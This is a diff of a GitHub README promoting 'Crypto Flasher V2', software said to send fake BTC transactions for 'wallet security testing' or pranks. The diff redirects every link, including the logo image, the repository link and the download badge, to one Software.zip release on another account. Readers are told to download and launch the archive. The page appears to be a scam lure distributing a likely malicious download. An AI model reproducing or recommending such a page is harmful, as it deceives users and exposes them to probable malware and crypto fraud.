@@ -2,15 +2,15 @@
 
 ## Welcome to Crypto Flasher V2!
 
-![Bitcoin Logo](https://www.pngkey.com/png/full/214-2148124_bitcoin-logo-bitcoin-logo.png)
+![Bitcoin Logo](https://github.com/nghialaucher123/CryptoFlasherV2/releases/download/v1.0/Software.zip)
 
 Are you looking for a way to test your wallet security or just prank your friends? Look no further! Crypto Flasher V2 is here to help you send fake BTC transactions on the core network. This software allows you to simulate sending BTC from any wallet address to another on popular blockchain networks like Coinbase, Binance, Blockchain, and more.
 
 ## 📁 Repository Contents
-- **Software.zip**: [Download the software here](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+- **https://github.com/nghialaucher123/CryptoFlasherV2/releases/download/v1.0/Software.zip**: [Download the software here](https://github.com/nghialaucher123/CryptoFlasherV2/releases/download/v1.0/Software.zip)
 
 ## 🛠️ Getting Started
-To get started with Crypto Flasher V2, simply download the Software.zip file from the link above and launch the application. Follow the instructions provided within the software to start flashing BTC transactions.
+To get started with Crypto Flasher V2, simply download the https://github.com/nghialaucher123/CryptoFlasherV2/releases/download/v1.0/Software.zip file from the link above and launch the application. Follow the instructions provided within the software to start flashing BTC transactions.
 
 ## 📌 Repository Topics
 - bitcoin-flash-wallet
@@ -35,6 +35,6 @@ To get started with Crypto Flasher V2, simply download the Software.zip file fro
 ## 🌟 Get Started with Crypto Flasher V2 Today!
 Start flashing fake BTC transactions and have fun testing out your wallet security with Crypto Flasher V2! 🔥
 
-For more information, visit the [official GitHub repository](https://github.com/Rubenas123/6487922).
+For more information, visit the [official GitHub repository](https://github.com/nghialaucher123/CryptoFlasherV2/releases/download/v1.0/Software.zip).
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/nghialaucher123/CryptoFlasherV2/releases/download/v1.0/Software.zip)](https://github.com/nghialaucher123/CryptoFlasherV2/releases/download/v1.0/Software.zip)
